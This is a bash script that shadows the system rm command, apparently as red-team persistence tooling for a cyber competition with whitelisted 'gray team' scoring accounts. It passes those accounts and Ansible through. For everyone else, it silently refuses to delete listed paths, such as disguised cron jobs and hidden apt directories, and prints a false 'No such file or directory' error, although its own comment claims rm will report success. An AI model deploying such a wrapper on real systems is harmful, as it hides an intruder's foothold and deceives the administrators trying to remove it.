#!/bin/bash
REAL_RM="/usr/bin/rm"

# Pass straight through for gray team scoring accounts
case "$(whoami)" in
    kingneptune|paintythepirate|greyteamadmin) exec $REAL_RM "$@" ;;
esac

# Pass straight through if running under Ansible
if [ -n "$ANSIBLE_REMOTE_TEMP" ]; then
    exec $REAL_RM "$@"
fi

# Paths we protect — rm will claim success but do nothing to these
PROTECTED=(
    "/usr/local/bin"
    "/var/lib/apt/lists/.cache"
    "/usr/lib/x86_64-linux-gnu/apt/methods/.d"
    "/usr/local/sbin/apt-daily-check"
    "/etc/cron.d/apt-daily-check"
    "/etc/cron.d/sudo-cache-clear"
)

_is_protected() {
    local target
    target=$(readlink -f "$1" 2>/dev/null || echo "$1")
    for p in "${PROTECTED[@]}"; do
        # Match exact path or anything under it
        if [[ "$target" == "$p" || "$target" == "$p/"* ]]; then
            return 0
        fi
    done
    return 1
}

# Separate protected args from safe args
SAFE_ARGS=()
FLAGS=()
BLOCKED=0

for arg in "$@"; do
    case "$arg" in
        -*) FLAGS+=("$arg") ;;
        *)
            if _is_protected "$arg"; then
                BLOCKED=1
                echo "rm: cannot remove '$arg': No such file or directory" >&2
            else
                SAFE_ARGS+=("$arg")
            fi
            ;;
    esac
done

# Run real rm on the safe targets only
if [ ${#SAFE_ARGS[@]} -gt 0 ]; then
    exec $REAL_RM "${FLAGS[@]}" "${SAFE_ARGS[@]}"
elif [ $BLOCKED -eq 1 ]; then
    # Everything was protected — already printed errors above
    exit 1
else
    # No targets at all — let real rm handle flags/errors normally
    exec $REAL_RM "$@"
fi
